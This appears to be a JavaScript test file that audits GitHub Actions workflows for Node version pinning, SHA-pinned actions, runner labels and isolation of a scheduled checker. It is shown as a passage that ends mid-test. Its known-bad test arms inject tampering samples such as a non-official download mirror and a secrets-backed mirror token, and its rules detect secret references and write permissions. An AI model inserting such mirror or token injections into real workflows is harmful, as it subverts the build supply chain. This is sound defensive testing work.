// CI 設定契約（Workstream E，2026-10-27）：Node 釘住單一來源 + 明確 runner 標籤 + SHA 釘住 + 排程檢查器隔離。
// 零依賴、離線；對 workflow 檔做「行為導向」的文字稽核。所有檢查都抽成純函式，CI-6 以文字變異的 known-bad 臂證明
// 每條檢查都會 RED（非恆真）。
//
// 稽核前先經 normalizeYaml()（跨模型審查 Grok R2/R3）：引號鍵（`"node-version":`）、鍵與冒號間空白（`node-version :`）、
// 大小寫（Actions 的 `with:` 輸入名不分大小寫）、尾註解（`exfil: # note`）都是合法且會被 GitHub 接受的寫法——
// 只匹配裸鍵的正則會被它們繞過。另外 CI-5b 以「正規化後的 canonical form 等式」釘住 node-pin-check.yml 的整體結構
// （只允許 action SHA / 版本註解 / cron 變動），使任何語義稽核沒想到的新步驟 / 鍵都 RED（縱深）。
// 行級稽核的根本限制（Grok R4 F2）：YAML 還有 `? key` 明示鍵、帶跳脫的引號鍵（`"mirror"`）、tag、文件標記……正則永遠
// 追不完。因此 CI-0 auditYamlSubset() 反過來只「接受」一個極小、行級可判定的 YAML 子集，任何不在子集內的行 → RED
// （fail closed）；兩個 workflow 檔都必須落在子集內，之後的語義檢查才建立在可判定的輸入上。
//   CI-0 兩個 workflow 檔都落在保守 YAML 子集內（裸鍵、無明示/引號鍵、無 tab、無文件標記、值不以 & * ! % @ ` 起始、
//        引號純量/flow 集合同行開合、同一映射無重複鍵、區塊純量依縮排略過）；且區塊純量內容對所有語義稽核不可見
//        （stripBlockScalars() 先於 normalizeYaml()；Codex r7 F1：否則 `- name: |` 內的假 setup-node 文字可冒充真步驟）。
//   CI-1 .node-version 為精確 X.Y.Z 且主版本 == APPROVED_MAJOR（22）。刻意升主版本線必須有意識地改這個常數。
//   CI-2 pages.yml：每個 job 各恰有一個 setup-node 且以 node-version-file: .node-version 取用；全檔無任何 node-version 鍵。
//   CI-3 pages.yml + node-pin-check.yml：每個 runs-on 都是明確的 ubuntu-26.04。
//   CI-4 每個 uses: 都是 GitHub-owned、40-hex SHA 釘住並帶 # vX.Y.Z 註解。
//   CI-5 node-pin-check.yml 隔離：只有 schedule + workflow_dispatch；恰一個頂層 permissions = contents: read；無任何 write；
//        無 secrets/GITHUB_TOKEN；無 Pages/deploy/environment；單一 job；uses 白名單 {checkout, setup-node}；
//        run 白名單 {node scripts/check-node-pin.mjs}；無 shell/env/container/services；timeout-minutes。
//   CI-5b node-pin-check.yml canonical form（正規化後、SHA/cron 以 placeholder 取代）== 內嵌模板；cron 本身必須是會觸發的
//        每週 "M H * * D"（Grok R4 F3：`0 0 31 2 *` 永不觸發卻能通過 placeholder 等式）。
//   CI-6 known-bad 臂。
import test from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';

const ROOT = new URL('../', import.meta.url);
const PAGES = readFileSync(new URL('.github/workflows/pages.yml', ROOT), 'utf8');
const PIN_CHECK = readFileSync(new URL('.github/workflows/node-pin-check.yml', ROOT), 'utf8');
const NODE_VERSION_FILE = readFileSync(new URL('.node-version', ROOT), 'utf8');

export const APPROVED_MAJOR = 22; // Owner-approved CI line (2026-10-27). Changing it is a conscious decision, not maintenance.
const RUNNER_LABEL = 'ubuntu-26.04';
const PIN_CHECK_ALLOWED_USES = ['actions/checkout', 'actions/setup-node'];
const PIN_CHECK_RUN = 'node scripts/check-node-pin.mjs';

// ── 正規化 ─────────────────────────────────────────────────────────────────
function lines(text) { return text.split('\n'); }
function indentOf(l) { return l.match(/^ */)[0].length; }
function isComment(l) { return /^\s*#/.test(l); }

// 區塊純量（`key: |` / `key: >`）的內容行以空行取代（保留行數）。Codex r7 F1：lexer 會略過區塊純量內容，但若其後的行級語義
// 稽核（stepBlocks / withBlockOf / jobBlocks / uses 釘住）仍掃到那些內容，`- name: |` 內的假 `uses: actions/setup-node@…` 就能
// 冒充真步驟。因此「結構」只有一個來源 —— lexer 的判定：所有語義稽核都先經 stripBlockScalars()，純量內容對它們一律不可見。
export const BLOCK_SCALAR_HEADER = /^[|>](?:[1-9]?[-+]?|[-+]?[1-9]?)\s*(?:#.*)?$/;
export function stripBlockScalars(text) {
  const out = []; let scalar = null;
  for (const raw of lines(text)) {
    if (scalar) {
      if (raw.trim() === '' || indentOf(raw) > scalar.indent) { out.push(''); continue; }
      scalar = null;
    }
    out.push(raw);
    if (isComment(raw)) continue;
    const m = raw.match(/^( *)(- )?([A-Za-z_][A-Za-z0-9_-]*):(?: (.*))?$/);
    if (m && BLOCK_SCALAR_HEADER.test((m[4] ?? '').trim())) scalar = { indent: m[1].length + (m[2] ? 2 : 0) };
  }
  return out.join('\n');
}

// 每一非註解行：鍵去引號、鍵小寫、去「鍵與冒號間空白」。值與尾註解保留（uses 的 `# vX.Y.Z` 需要）。先 stripBlockScalars()。
export function normalizeYaml(text) {
  return lines(stripBlockScalars(text)).map((l) => {
    if (isComment(l)) return l;
    const m = l.match(/^(\s*(?:- )?)(["']?)([A-Za-z0-9_.-]+)\2\s*:(.*)$/);
    if (!m) return l;
    return `${m[1]}${m[3].toLowerCase()}:${m[4]}`;
  }).join('\n');
}
// 鍵行的尾註解去除（只用於結構比對 / job id 擷取；不用於 uses 釘住檢查）
function stripTrailingComment(l) { return isComment(l) ? l : l.replace(/\s+#.*$/, ''); }

// ── 純函式稽核（皆以正規化文字工作）──────────────────────────────────────────
export function auditNodeVersionFile(text) {
  const problems = [];
  const v = text.trim();
  if (!/^\d+\.\d+\.\d+$/.test(v)) problems.push(`.node-version must be an exact X.Y.Z (no ranges, aliases or v-prefix), got: "${v}"`);
  else if (Number(v.split('.')[0]) !== APPROVED_MAJOR) problems.push(`.node-version major ${v.split('.')[0]} != approved ${APPROVED_MAJOR} (moving major lines is an Owner decision — update APPROVED_MAJOR consciously)`);
  if (text !== `${v}\n`) problems.push('.node-version must be exactly the version plus one trailing newline');
  return problems;
}

// 以「`- <key>:` 開頭的行」切出序列項區塊（含其後更深縮排的行）。任何鍵都可起始一個步驟（`- id:` / `- if:` / `- run:` 也合法），
// 不只 name/uses；`on:` 下的 `- cron:` 也會成為一個區塊，但後續過濾只看 `uses: actions/setup-node@`，無害。
export function stepBlocks(text) {
  const ls = lines(normalizeYaml(text)); const blocks = []; let cur = null;
  for (const l of ls) {
    if (/^\s*- [a-z_][a-z0-9_-]*:/.test(l)) { if (cur) blocks.push(cur); cur = { indent: indentOf(l), text: [l] }; continue; }
    if (cur && (l.trim() === '' || indentOf(l) > cur.indent || isComment(l))) { cur.text.push(l); continue; }
    if (cur) { blocks.push(cur); cur = null; }
  }
  if (cur) blocks.push(cur);
  return blocks.map((b) => b.text.join('\n'));
}

export function auditUsesPinning(text) {
  const problems = [];
  for (const l of lines(normalizeYaml(text))) {
    const m = l.match(/^\s*(?:- )?uses:\s*(\S+)(.*)$/);
    if (!m) continue;
    const [, ref, rest] = m;
    if (!/^[^@\s]+@[0-9a-f]{40}$/.test(ref)) problems.push(`uses not pinned to a 40-hex commit SHA: ${ref}`);
    if (!/^\s*#\s*v\d+\.\d+\.\d+\s*$/.test(rest)) problems.push(`uses lacks the "# vX.Y.Z" release comment: ${ref}`);
    if (!/^actions\//.test(ref)) problems.push(`uses is not a GitHub-owned action (repo policy = GitHub-owned only): ${ref}`);
  }
  return problems;
}

export function auditRunsOn(text) {
  const problems = [];
  const found = lines(normalizeYaml(text)).filter((l) => /^\s*runs-on:/.test(l));
  if (!found.length) problems.push('no runs-on found');
  for (const l of found) {
    const v = stripTrailingComment(l).replace(/^\s*runs-on:\s*/, '').trim().replace(/^["']|["']$/g, '');
    if (v !== RUNNER_LABEL) problems.push(`runs-on must be the explicit GA label ${RUNNER_LABEL}, got: ${v}`);
  }
  return problems;
}

// setup-node 的 with 鍵白名單（Grok R3 F2/F4）：`mirror`/`mirror-token` 可把 Node 下載來源換成非官方主機、`check-latest`
// 的任何布林寫法（"true"/True）、`registry-url`、`token`、`architecture` 都不在本 repo 契約內——未列名即 RED，要新增須有意識地改這裡。
const SETUP_NODE_ALLOWED_WITH = ['node-version-file', 'cache'];
// setup-node 步驟本身的鍵白名單（Grok r7 F2）：`if: false` 讓 GitHub 跳過步驟、`continue-on-error: true` 讓失敗被忽略、
// `env:`/`timeout-minutes:` 等都能讓釘住的 Node 實際上沒被安裝（job 落回 runner 映像自帶的 Node）→ 只允許 name / uses / with。
const SETUP_NODE_ALLOWED_STEP_KEYS = ['name', 'uses', 'with'];

// 步驟映射的直接子鍵：`- key:` 的 key 加上其後同一欄位的鍵（去尾註解）。
export function stepKeys(stepText) {
  const ls = stepText.split('\n');
  const m = ls[0].match(/^( *)- ([a-z_][a-z0-9_-]*):/);
  if (!m) return [];
  const col = m[1].length + 2; const keys = [m[2]];
  for (const l of ls.slice(1)) {
    if (l.trim() === '' || isComment(l) || indentOf(l) !== col) continue;
    const k = stripTrailingComment(l).match(/^ *([a-z_][a-z0-9_-]*):/);
    if (k) keys.push(k[1]);
  }
  return keys;
}
// 步驟使用的 action：只看 `uses:` **鍵**（去尾註解、鍵錨定）。name 值或註解裡出現 `uses: actions/setup-node@…` 字樣不算
// （Grok r7 F1：先前以子字串比對整個步驟文字，把 checkout 步驟改名成那個字串就能冒充 setup-node）。
export function usesRefOf(stepText) {
  for (const l of stepText.split('\n')) {
    if (isComment(l)) continue;
    const m = stripTrailingComment(l).match(/^ *(?:- )?uses: *(\S+) *$/);
    if (m) return m[1];
  }
  return null;
}
export const isSetupNodeStep = (stepText) => /^actions\/setup-node@/.test(usesRefOf(stepText) || '');

// setup-node 步驟的 `with:` 區塊（Codex confirmation F1）：node-version-file 必須出現在 **with: 區塊內**（不是 env: 或步驟
// 其他位置）；`with:` 本身必須是裸鍵（`with: {…}` flow-style → fail closed）；區塊內每個鍵都受白名單約束。
// 區塊內任何不是「裸鍵: 值」的行（`? key` 明示鍵、帶跳脫的引號鍵、續行……）→ 不猜測、直接 RED（Grok R4 F2）；
// 同一步驟出現多個 `with:` → RED（解析器 first/last-wins 不一致，稽核不得只看第一個）。
function withBlockOf(stepText) {
  const ls = stepText.split('\n');
  const problems = [];
  const withLines = ls.filter((l) => /^\s*with:/.test(stripTrailingComment(l)));
  if (withLines.length > 1) problems.push(`setup-node step has more than one with: block (${withLines.length}) — fail closed`);
  const idx = ls.findIndex((l) => /^\s*with:/.test(stripTrailingComment(l)));
  if (idx < 0) return { present: false, flow: false, keys: [], problems };
  const header = stripTrailingComment(ls[idx]);
  if (!/^\s*with:\s*$/.test(header)) return { present: true, flow: true, keys: [], problems }; // `with: {…}` 或其他非區塊寫法
  const indent = indentOf(ls[idx]);
  const keys = [];
  for (const l of ls.slice(idx + 1)) {
    if (l.trim() === '' || isComment(l)) continue;
    if (indentOf(l) <= indent) break;
    const m = stripTrailingComment(l).match(/^\s+([a-z][a-z0-9_-]*):\s*(.*)$/);
    if (m) keys.push({ key: m[1], value: m[2] });
    else problems.push(`unrecognised line inside setup-node with: block (explicit/quoted key, continuation or other YAML the audit cannot follow) — fail closed: "${l.trim().slice(0, 60)}"`);
  }
  return { present: true, flow: false, keys, problems };
}

export function auditSetupNode(text, { expectedSteps }) {
  const problems = [];
  const norm = normalizeYaml(text);
  const steps = stepBlocks(text).filter(isSetupNodeStep);
  if (steps.length !== expectedSteps) problems.push(`expected ${expectedSteps} setup-node steps, found ${steps.length}`);
  for (const s of steps) {
    const extra = stepKeys(s).filter((k) => !SETUP_NODE_ALLOWED_STEP_KEYS.includes(k));
    if (extra.length) problems.push(`setup-node step carries keys outside {${SETUP_NODE_ALLOWED_STEP_KEYS.join(', ')}} (if / continue-on-error / env / … can skip or neuter the pin): ${extra.join(', ')}`);
    const w = withBlockOf(s);
    problems.push(...w.problems);
    if (!w.present) problems.push('setup-node step has no with: block (node-version-file must be passed under with:)');
    else if (w.flow) problems.push('setup-node with: must be a block mapping, not flow-style (audit cannot follow `with: {…}`) — fail closed');
    else {
      const nvf = w.keys.find((k) => k.key === 'node-version-file');
      if (!nvf || !/^["']?\.node-version["']?$/.test(nvf.value.trim())) problems.push('setup-node with: block does not consume node-version-file: .node-version');
      for (const k of w.keys) {
        if (k.key === 'node-version') problems.push('setup-node with: still carries a node-version key (second source of truth; setup-node prefers it over the file)');
        else if (k.key === 'check-latest') problems.push('setup-node with: sets check-latest (any value; the reproducibility contract forbids the key)');
        else if (!SETUP_NODE_ALLOWED_WITH.includes(k.key)) problems.push(`setup-node with-key not allowlisted (${SETUP_NODE_ALLOWED_WITH.join(', ')}): "${k.key}"`);
      }
    }
  }
  if (/^\s*node-version:/m.test(norm)) problems.push('workflow contains a node-version key somewhere');
  return problems;
}

// CI-0 — YAML 保守子集（Grok R4 F2：`? node-version` 明示鍵、`"mirror"` 帶跳脫的引號鍵都是合法 YAML，GitHub 的解析器
// 會把它們變成真正的輸入，而任何行級正則都看不到）。不嘗試解讀全部 YAML；只接受一個極小、行級可判定的子集，其餘一律 RED。
//   接受：`key:` / `key: value` / `- key:` / `- key: value`（鍵 = 裸 [A-Za-z_][A-Za-z0-9_-]*、不加引號、鍵與冒號間無空白、
//        冒號後必須是行尾或空白）、註解、空行、以 `|`/`>` 起始之區塊純量的內容（縮排 > 鍵欄位的行，依縮排追蹤）。
//   拒絕：`? ` 明示鍵、引號鍵、`<<:`、tab 縮排、文件標記 `---`/`...`、`%` 指令、值以 & * ! % @ ` 起始（anchor/alias/tag/保留）、
//        純量序列項、續行、同一映射內重複的鍵（含大小寫不同的同名 with 輸入：GitHub 視為同一輸入；解析器 first/last-wins 不一致）。
//   以「原始文字」稽核（不先 normalizeYaml）：引號鍵在子集外，整體拒絕，而非只處理 normalizeYaml 看得懂的那些。
export function auditYamlSubset(text) {
  const problems = [];
  const frames = []; // 重複鍵偵測：{ indent, keys } 堆疊，indent = 鍵所在欄位
  let scalar = null; // 正在略過的區塊純量：內容 = 縮排 > scalar.indent 的行
  const ls = lines(text);
  for (let i = 0; i < ls.length; i++) {
    const raw = ls[i];
    const where = `line ${i + 1}: "${raw.trim().slice(0, 60)}"`;
    if (raw.trim() === '') continue;
    if (scalar) { if (indentOf(raw) > scalar.indent) continue; scalar = null; }
    if (isComment(raw)) continue;
    if (/^ *\t/.test(raw)) { problems.push(`tab indentation is outside the accepted YAML subset — fail closed: ${where}`); continue; }
    const m = raw.match(/^( *)(- )?([A-Za-z_][A-Za-z0-9_-]*):(?: (.*))?$/);
    if (!m) { problems.push(`YAML line outside the accepted subset (explicit "? key", quoted key, plain sequence item, continuation, document marker, …) — fail closed: ${where}`); continue; }
    const indent = m[1].length; const dash = Boolean(m[2]); const key = m[3].toLowerCase(); const value = (m[4] ?? '').trim();
    if (/^[&*!%@`]/.test(value)) problems.push(`YAML value starts with a reserved indicator (anchor/alias/tag/directive) — fail closed: ${where}`);
    // 引號純量與 flow 集合必須在同一行開合：跨行的 `"…` / `'…` / `[…` / `{…` 可把看起來像 `key: value` 的行藏進一個純量裡
    // （真實解析器視為純量內容，行級稽核卻當成結構）→ 一律 RED（Codex r7 F1 的同類延伸）。
    if (/^"/.test(value) && !/^"(?:[^"\\]|\\.)*"\s*(?:#.*)?$/.test(value)) problems.push(`double-quoted value must open and close on the same line (a multi-line quoted scalar can hide "key:" lines from the audits) — fail closed: ${where}`);
    if (/^'/.test(value) && !/^'(?:[^']|'')*'\s*(?:#.*)?$/.test(value)) problems.push(`single-quoted value must open and close on the same line — fail closed: ${where}`);
    if (/^\[/.test(value) && !/^\[[^\]]*\]\s*(?:#.*)?$/.test(value)) problems.push(`flow sequence must close on the same line — fail closed: ${where}`);
    if (/^\{/.test(value) && !/^\{[^}]*\}\s*(?:#.*)?$/.test(value)) problems.push(`flow mapping must close on the same line — fail closed: ${where}`);
    // 純量值（非引號/flow/區塊純量）不得含 `: `：YAML 本身禁止（`a: b: c` 是解析錯誤），真實解析器會拒絕的輸入稽核也不得接受
    if (/^[^"'[{|>]/.test(value) && /: /.test(stripTrailingComment(` ${value}`))) problems.push(`plain scalar value contains ": " (invalid YAML — a real parser rejects it) — fail closed: ${where}`);
    const keyCol = dash ? indent + 2 : indent;
    if (dash) {
      while (frames.length && frames.at(-1).indent >= keyCol) frames.pop();
      frames.push({ indent: keyCol, keys: new Set([key]) });
    } else {
      while (frames.length && frames.at(-1).indent > keyCol) frames.pop();
      const top = frames.at(-1);
      if (top && top.indent === keyCol) {
        if (top.keys.has(key)) problems.push(`duplicate key "${key}" in the same mapping (parsers disagree on first/last-wins) — fail closed: ${where}`);
        top.keys.add(key);
      } else frames.push({ indent: keyCol, keys: new Set([key]) });
    }
    if (BLOCK_SCALAR_HEADER.test(value)) scalar = { indent: keyCol };
  }
  return problems;
}

// YAML 構造 fail-closed（Grok R3 F1）：anchor（`key: &a`）、alias（`*a`）、merge key（`<<:`）與 flow-style 映射/序列作為
// job/step 定義都是 GitHub 會接受、而行級稽核看不透的寫法 → 一律 RED，不嘗試解讀。先跑 CI-0 子集稽核（原始文字），再跑
// 正規化文字上的構造檢查。
export function auditYamlConstructs(text) {
  const problems = [...auditYamlSubset(text)];
  for (const l of lines(normalizeYaml(text))) {
    if (isComment(l)) continue;
    const s = stripTrailingComment(l);
    if (/:\s*[&*][A-Za-z0-9_-]+\s*$/.test(s) || /^\s*-\s*[&*][A-Za-z0-9_-]+/.test(s)) problems.push(`YAML anchor/alias not allowed (audit cannot follow it): "${s.trim()}"`);
    if (/^\s*<<\s*:/.test(s)) problems.push(`YAML merge key not allowed: "${s.trim()}"`);
    if (/^  [a-z_][a-z0-9_-]*:\s*[{[]/.test(s) || /^\s*-\s*[{[]/.test(s)) problems.push(`flow-style mapping/sequence not allowed for jobs/steps: "${s.trim()}"`);
    // 結構鍵（with / permissions / env / steps / jobs / on）不得用 flow-style 寫法（`branches: ["main"]` 這類純量序列不在此列）
    if (/^\s*(?:- )?(with|permissions|env|steps|jobs|on):\s*[{[]/.test(s)) problems.push(`flow-style value not allowed for structural key: "${s.trim()}"`);
  }
  return problems;
}

// jobs: 區塊內 2 空白縮排的鍵 = job 名稱（允許引號、尾註解；GitHub job id：字母/底線起首，含數字 - _）。
// 任何冒號後帶內容的 2 空白鍵（anchor / flow）都會被 auditPagesWorkflow 當成不支援語法 RED，不會被靜默略過。
export function jobNames(text) {
  const m = normalizeYaml(text).match(/^jobs:\n([\s\S]*)$/m);
  return m ? (m[1].match(/^  [a-z_][a-z0-9_-]*:/gm) || []).map((j) => j.trim().replace(':', '')) : [];
}
export function jobBlocks(text) {
  const m = normalizeYaml(text).match(/^jobs:\n([\s\S]*)$/m);
  if (!m) return {};
  const out = {}; let cur = null;
  for (const l of m[1].split('\n')) {
    const h = l.match(/^  ([a-z_][a-z0-9_-]*):/);
    if (h) { cur = h[1]; out[cur] = []; continue; }
    if (cur) out[cur].push(l);
  }
  return Object.fromEntries(Object.entries(out).map(([k, v]) => [k, v.join('\n')]));
}
function auditJobHeaders(text) {
  const m = normalizeYaml(text).match(/^jobs:\n([\s\S]*)$/m);
  if (!m) return ['no jobs: block'];
  const problems = [];
  for (const l of m[1].split('\n')) {
    if (isComment(l) || l.trim() === '') continue;
    if (indentOf(l) === 2 && !/^  [a-z_][a-z0-9_-]*:\s*(#.*)?$/.test(l)) problems.push(`unsupported job header syntax (anchor/alias/flow/other) — fail closed: "${l.trim()}"`);
    if (indentOf(l) < 2) problems.push(`unexpected top-level content after jobs: "${l.trim()}"`);
  }
  return problems;
}

export function auditPagesWorkflow(text) {
  const names = jobNames(text);
  const problems = [
    ...auditYamlConstructs(text),
    ...auditJobHeaders(text),
    ...auditUsesPinning(text),
    ...auditRunsOn(text),
    ...auditSetupNode(text, { expectedSteps: 3 }),
    ...(names.length === 3 ? [] : [`expected 3 jobs (validate, browser-smoke, deploy), found ${names.length}: ${names.join(', ')}`]),
  ];
  for (const [job, block] of Object.entries(jobBlocks(text))) {
    const blocks = stepBlocks(block);
    const n = blocks.filter(isSetupNodeStep).length;
    if (n !== 1) problems.push(`job "${job}" must have exactly one setup-node step consuming .node-version, found ${n}`);
    // 順序：setup-node 必須在該 job 第一個 `run:` 步驟之前，否則該 run 以 runner 映像自帶的 Node 執行（與 Grok r7 F2 同類：釘住的 Node 實際未生效）
    const iSetup = blocks.findIndex(isSetupNodeStep); const iRun = blocks.findIndex((b) => stepKeys(b).includes('run'));
    if (iSetup >= 0 && iRun >= 0 && iRun < iSetup) problems.push(`job "${job}": a run: step precedes the setup-node step (it would execute on the image's default Node, not .node-version)`);
    // job 層不得以 container / services 換掉執行環境（runner OS 是可重現性輸入；CI-3 的意圖）
    for (const k of (block.match(/^    (container|services) *:/gm) || [])) problems.push(`job "${job}" must not use "${k.trim()}" (the runner image label is the reproducibility input)`);
  }
  return problems;
}

export function auditPinCheckWorkflow(text) {
  const norm = normalizeYaml(text);
  const nl = lines(norm);
  const problems = [...auditYamlConstructs(text), ...auditJobHeaders(text), ...auditUsesPinning(text), ...auditRunsOn(text), ...auditSetupNode(text, { expectedSteps: 1 })];
  const onBlock = norm.match(/^on:\n((?:[ \t]+.*\n?)+)/m);
  if (!onBlock) problems.push('no on: block');
  else {
    const triggers = (onBlock[1].match(/^  ([a-z_]+):/gm) || []).map((t) => t.trim().replace(':', ''));
    const extra = triggers.filter((t) => !['schedule', 'workflow_dispatch'].includes(t));
    if (extra.length) problems.push(`pin-check must only be triggered by schedule/workflow_dispatch, found: ${extra.join(', ')}`);
    if (!triggers.includes('schedule')) problems.push('pin-check lacks a schedule trigger');
    if (!triggers.includes('workflow_dispatch')) problems.push('pin-check lacks the workflow_dispatch trigger (manual re-run after the 60-day schedule disablement)');
  }
  const permBlocks = nl.filter((l) => /^\s*permissions:/.test(l));
  if (permBlocks.length !== 1 || !/^permissions:\s*$/.test(stripTrailingComment(permBlocks[0] || ''))) problems.push(`pin-check must have exactly one top-level permissions: block, found ${permBlocks.length} (${permBlocks.map((l) => l.trim()).join(' | ')})`);
  const perms = norm.match(/^permissions:\n((?:[ \t]+.*\n?)+)/m);
  if (!perms) problems.push('pin-check lacks an explicit permissions: block');
  else if (stripTrailingComment(perms[1]).trim() !== 'contents: read') problems.push(`pin-check permissions must be exactly "contents: read", got: ${perms[1].trim().replace(/\n/g, ' | ')}`);
  for (const l of nl) {
    const s = stripTrailingComment(l);
    if (/^\s*[a-z-]+:\s*["']?write(-all)?["']?\s*$/.test(s) || /^\s*permissions:\s*["']?write-all["']?\s*$/.test(s)) problems.push(`pin-check must not hold any write permission: "${s.trim()}"`);
    if (/^\s*(shell|env|container|services|environment|defaults|strategy|outputs|secrets):/.test(s)) problems.push(`pin-check must not use "${s.trim().split(':')[0]}:" (no shell override, env, containers, services, environments or secrets in the isolated reporter)`);
  }
  if (/\$\{\{\s*secrets\./.test(norm) || /GITHUB_TOKEN/.test(norm)) problems.push('pin-check must not reference secrets or GITHUB_TOKEN');
  if (/(configure-pages|upload-pages-artifact|deploy-pages)/.test(norm)) problems.push('pin-check must not contain Pages/deploy actions');
  if (!/^\s*timeout-minutes:\s*\d+/m.test(norm)) problems.push('pin-check job lacks timeout-minutes');
  const uses = nl.map((l) => l.match(/^\s*(?:- )?uses:\s*([^@\s]+)@/)).filter(Boolean).map((m) => m[1]);
  for (const u of uses) if (!PIN_CHECK_ALLOWED_USES.includes(u)) problems.push(`pin-check may only use ${PIN_CHECK_ALLOWED_USES.join(', ')}; found ${u}`);
  if (uses.length !== 2) problems.push(`pin-check must have exactly 2 uses steps (checkout + setup-node), found ${uses.length}`);
  const runs = nl.filter((l) => /^\s*(?:- )?run:/.test(l)).map((l) => stripTrailingComment(l).replace(/^\s*(?:- )?run:\s*/, '').trim().replace(/^["']|["']$/g, ''));
  if (runs.length !== 1 || runs[0] !== PIN_CHECK_RUN) problems.push(`pin-check may only run "${PIN_CHECK_RUN}", found: [${runs.join(' | ')}]`);
  const withKeys = nl.filter((l) => /^\s{10}[a-z-]+:/.test(l)).map((l) => stripTrailingComment(l).trim().split(':')[0]);
  for (const k of withKeys) if (k !== 'node-version-file') problems.push(`pin-check setup-node may only pass node-version-file, found with-key "${k}"`);
  if (jobNames(text).length !== 1) problems.push(`pin-check must have exactly one job, found ${jobNames(text).length}`);
  // cron 必須真的會觸發（Grok R4 F3：`0 0 31 2 *` 通過 CI-5b 的 placeholder 等式卻永不執行）：只接受每週 "M H * * D"
  // （分 0-59、時 0-23、週 0-6；不接受名稱、清單、步進、@weekly、日/月欄位）。
  const crons = nl.map((l) => stripTrailingComment(l).match(/^\s*-\s*cron:\s*(.*)$/)).filter(Boolean).map((m) => m[1].trim().replace(/^["']|["']$/g, ''));
  if (crons.length !== 1) problems.push(`pin-check must declare exactly one cron, found ${crons.length}`);
  for (const c of crons) {
    const f = c.match(/^(\d{1,2}) (\d{1,2}) \* \* ([0-6])$/);
    if (!f || Number(f[1]) > 59 || Number(f[2]) > 23) problems.push(`pin-check cron must be a weekly "M H * * D" expression that actually fires (minute 0-59, hour 0-23, day-of-week 0-6), got: "${c}"`);
  }
  return problems;
}

// CI-5b：canonical form —— 正規化、去註解/空行、SHA 與版本註解與 cron 以 placeholder 取代。
export function canonicalPinCheck(text) {
  return lines(normalizeYaml(text))
    .filter((l) => !isComment(l) && l.trim() !== '')
    .map((l) => l.replace(/@[0-9a-f]{40}\s*#\s*v\d+\.\d+\.\d+\s*$/, '@SHA # vX').replace(/cron:\s*["'][^"']+["'].*$/, 'cron: "CRON"'))
    .join('\n');
}
const PIN_CHECK_CANONICAL = [
  'name: Node pin check',
  'on:',
  '  schedule:',
  '    - cron: "CRON"',
  '  workflow_dispatch:',
  'permissions:',
  '  contents: read',
  'jobs:',
  '  check:',
  `    runs-on: ${RUNNER_LABEL}`,
  '    timeout-minutes: 5',
  '    steps:',
  '      - name: Checkout',
  '        uses: actions/checkout@SHA # vX',
  '      - name: Set up Node.js (from .node-version)',
  '        uses: actions/setup-node@SHA # vX',
  '        with:',
  '          node-version-file: ".node-version"',
  '      - name: Compare .node-version against the official Node.js release index and schedule',
  `        run: ${PIN_CHECK_RUN}`,
].join('\n');

function mutate(source, from, to) {
  const out = source.replace(from, to);
  assert.notEqual(out, source, `mutation did not apply: ${String(from).slice(0, 60)}`);
  return out;
}

// ── 契約 ────────────────────────────────────────────────────────────────────
test('CI-1: .node-version is an exact X.Y.Z on the approved major line', () => {
  assert.deepEqual(auditNodeVersionFile(NODE_VERSION_FILE), []);
  assert.match(NODE_VERSION_FILE.trim(), /^22\.\d+\.\d+$/);
});

test('CI-2: every job in pages.yml has exactly one setup-node step consuming .node-version; no node-version key anywhere', () => {
  assert.deepEqual(auditSetupNode(PAGES, { expectedSteps: 3 }), []);
  assert.deepEqual(auditPagesWorkflow(PAGES), []);
  assert.doesNotMatch(PAGES, /22\.23\.4/, 'the patch literal must not appear in the workflow any more (single source = .node-version)');
});

test('CI-3: every runs-on in pages.yml and node-pin-check.yml is the explicit ubuntu-26.04 label', () => {
  assert.deepEqual(auditRunsOn(PAGES), []);
  assert.deepEqual(auditRunsOn(PIN_CHECK), []);
  const codeLines = (PAGES + '\n' + PIN_CHECK).split('\n').filter((l) => !isComment(l));
  assert.equal(codeLines.filter((l) => /ubuntu-latest/.test(l)).length, 0, 'no non-comment line may reference ubuntu-latest');
  assert.deepEqual(jobNames(PAGES), ['validate', 'browser-smoke', 'deploy']);
  assert.deepEqual(jobNames(PIN_CHECK), ['check']);
});

test('CI-4: every uses: in both workflows is a GitHub-owned action pinned to a 40-hex SHA with a # vX.Y.Z comment', () => {
  assert.deepEqual(auditUsesPinning(PAGES), []);
  assert.deepEqual(auditUsesPinning(PIN_CHECK), []);
});

test('CI-5: node-pin-check.yml is isolated — schedule/dispatch only, contents: read only, no write/secrets/shell/env, allowlisted uses+run, one job, timeout', () => {
  assert.deepEqual(auditPinCheckWorkflow(PIN_CHECK), []);
  const sha = (t) => t.match(/^\s*uses:\s*actions\/setup-node@([0-9a-f]{40})/m)[1];
  assert.equal(sha(PIN_CHECK), sha(PAGES));
});

test('CI-5b: node-pin-check.yml canonical form equals the frozen template (only action SHA/version comments and the cron may vary)', () => {
  assert.equal(canonicalPinCheck(PIN_CHECK), PIN_CHECK_CANONICAL);
});

test('CI-6: known-bad arms — each audit rule can actually fail, including quoted / spaced / cased / commented YAML variants', () => {
  // (a) literal node-version re-introduced, in bare, quoted, spaced and cased forms → CI-2 RED
  for (const variant of ['node-version: "22.23.4"', '"node-version": "24.22.1"', 'node-version : "24"', 'Node-Version: "24"']) {
    const t = mutate(PAGES, /node-version-file: "\.node-version"\n/, `node-version-file: ".node-version"\n          ${variant}\n`);
    assert.ok(auditSetupNode(t, { expectedSteps: 3 }).some((p) => /node-version key/.test(p)), `variant not caught: ${variant}`);
  }
  // (b) check-latest in any boolean spelling → RED (Grok R3 F4); other non-allowlisted with-keys (mirror → alternate download host) → RED (Grok R3 F2)
  for (const variant of ['check-latest: true', 'check-latest: "true"', 'Check-Latest: True', 'mirror: https://example.invalid', 'mirror-token: ${{ secrets.X }}', 'registry-url: https://example.invalid']) {
    const t = mutate(PAGES, /node-version-file: "\.node-version"\n/, `node-version-file: ".node-version"\n          ${variant}\n`);
    assert.ok(auditSetupNode(t, { expectedSteps: 3 }).some((p) => /check-latest|not allowlisted/.test(p)), `with-key variant not caught: ${variant}`);
  }
  assert.deepEqual(auditSetupNode(PAGES, { expectedSteps: 3 }), [], 'the real cache: "npm" key stays allowed');
  // (b′) Codex confirmation F1: node-version-file smuggled under env: while with: is a flow mapping carrying node-version → RED
  const WITH_BS = /        with:\n          node-version-file: "\.node-version"\n          cache: "npm"\n/; // browser-smoke 的 with: 區塊
  const envSmuggle = mutate(PAGES, WITH_BS, '        env:\n          node-version-file: ".node-version"\n        with: { node-version: "24" }\n');
  const es = auditSetupNode(envSmuggle, { expectedSteps: 3 });
